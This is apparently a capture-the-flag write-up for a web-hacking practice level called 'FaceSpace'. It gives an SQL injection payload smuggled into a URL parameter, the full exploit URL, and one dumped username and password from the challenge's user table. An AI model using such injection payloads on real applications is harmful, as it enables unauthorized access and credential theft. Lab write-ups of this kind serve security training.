#### Level 05 - FaceSpace - a space for your face

This SQL should get the password instead of the status:
```sql
SELECT username,password as status, rank FROM user--
```

Complete URL:

http://www.hacmegame.org/hacmegame/challenges/ChallengeS22.html?o=username;SELECT%20username,password%20as%20status,%20rank%20FROM%20user--

And we get a list of users with password, here is one `gorbatsjov:6ECkGsQd`